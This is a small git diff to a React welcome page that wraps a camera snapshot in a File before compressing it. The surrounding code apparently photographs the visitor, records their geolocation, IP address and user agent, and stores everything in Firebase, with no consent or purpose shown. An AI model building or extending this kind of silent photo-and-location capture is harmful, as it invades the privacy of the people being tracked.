@@ -111,31 +111,37 @@ export default function WelcomePage() {
       const imageCapture = new ImageCapture(track)
       const blob = await imageCapture.takePhoto()
       track.stop()
-
+  
+      // Convert Blob to File
+      const file = new File([blob], 'snapshot.jpg', {
+        lastModified: Date.now(),
+        type: blob.type,
+      })
+  
       // Compress the image to ensure it's within 100 KB
-      const compressedBlob = await imageCompression(blob, {
+      const compressedBlob = await imageCompression(file, {
         maxSizeMB: 0.1, // 0.1 MB = 100 KB
         maxWidthOrHeight: 1920, // Optional: Resize image to max 1920px width/height
         useWebWorker: true, // Optional: Use web worker for compression
       })
-
+  
       // Capture location
       navigator.geolocation.getCurrentPosition(async (position) => {
         const { latitude, longitude } = position.coords
-
+  
         // Get IP address
         const ipResponse = await fetch('https://api64.ipify.org?format=json')
         const ipData = await ipResponse.json()
         const ipAddress = ipData.ip
-
+  
         // Get device info from User-Agent
         const userAgent = navigator.userAgent
-
+  
         // Upload compressed image to Firebase Storage
         const storageRef = ref(storage, `images/${Date.now()}.jpg`)
         await uploadBytes(storageRef, compressedBlob)
         const imageUrl = await getDownloadURL(storageRef)
-
+  
         // Save image URL and location data to Firestore
         await addDoc(collection(firestore, 'images'), {
           imageUrl,
@@ -150,6 +156,7 @@ export default function WelcomePage() {
       enqueueSnackbar('Failed to capture image or location', { variant: 'error' })
     }
   }
+  
 
   return (
     <GoogleOAuthProvider clientId="YOUR_GOOGLE_CLIENT_ID">
